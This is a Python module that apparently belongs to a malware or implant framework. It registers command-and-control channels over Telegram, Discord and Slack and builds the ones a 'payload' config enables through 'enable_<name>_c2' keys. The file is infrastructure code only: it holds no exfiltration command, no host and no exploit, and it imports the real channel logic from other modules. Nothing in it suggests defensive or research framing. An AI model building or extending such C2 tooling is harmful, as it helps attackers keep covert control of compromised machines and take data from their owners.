"""C2 channel registry (telegram/discord/slack plugins).

One home for channel construction and payload-driven gating:
``enabled_channels`` reads the ``enable_<name>_c2`` payload keys,
``create_enabled`` builds only the channels with credentials present.
Factories stay fail-soft: a channel without credentials reports
``configured=False`` and never raises.
"""

from __future__ import annotations

from collections.abc import Callable
from typing import Any

from core.protocols import C2Channel
from modules.c2_channels.base import HttpC2Channel
from modules.c2_channels.discord import DiscordC2Channel
from modules.c2_channels.slack import SlackC2Channel
from modules.c2_channels.telegram import TelegramC2Channel

DEFAULT_FACTORIES: dict[str, Callable[[dict[str, Any]], HttpC2Channel]] = {
    "telegram": TelegramC2Channel,
    "discord": DiscordC2Channel,
    "slack": SlackC2Channel,
}

_FACTORIES: dict[str, Callable[[dict[str, Any]], HttpC2Channel]] = dict(DEFAULT_FACTORIES)

ENABLE_KEY_TEMPLATE = "enable_{name}_c2"


def register_channel(name: str, factory: Callable[[dict[str, Any]], HttpC2Channel], *, replace: bool = False) -> None:
    """Register one channel factory.

    Args:
        name: Channel name (also the payload gating key stem).
        factory: Zero-config-dict-arg constructor returning a channel.
        replace: Allow replacing an existing default factory.

    Raises:
        ValueError: On duplicate registration without ``replace``.
    """
    if name in _FACTORIES and not replace:
        raise ValueError(f"channel already registered: {name}")
    _FACTORIES[name] = factory


def available_channels() -> tuple[str, ...]:
    """Return the registered channel names."""
    return tuple(sorted(_FACTORIES))


def enabled_channels(config: dict[str, Any] | None = None) -> list[str]:
    """Return registered channels whose payload enable-key is truthy.

    Args:
        config: Payload dict; the caller supplies it so tests can pass
            isolated configs.
    """
    if config is None:
        from core.config import load_payload

        config = load_payload()
    enabled: list[str] = []
    for name in _FACTORIES:
        if bool(config.get(ENABLE_KEY_TEMPLATE.format(name=name), False)):
            enabled.append(name)
    return sorted(enabled)


def create_channel(name: str, config: dict[str, Any] | None = None) -> C2Channel | None:
    """Build one channel by name.

    Args:
        name: Registered channel name.
        config: Payload dict; loaded lazily when omitted.

    Returns:
        The channel instance, or None when the name is unknown.
    """
    factory = _FACTORIES.get(name)
    if factory is None:
        return None
    if config is None:
        from core.config import load_payload

        config = load_payload()
    return factory(config)


def create_enabled(config: dict[str, Any] | None = None) -> list[C2Channel]:
    """Build every enabled and registered channel.

    Args:
        config: Payload dict; loaded lazily when omitted.

    Returns:
        Channels with truthy enable keys; unconfigured ones are still
        returned but report ``configured=False``.
    """
    channels: list[C2Channel] = []
    for name in enabled_channels(config):
        channel = create_channel(name, config)
        if channel is not None:
            channels.append(channel)
    return channels
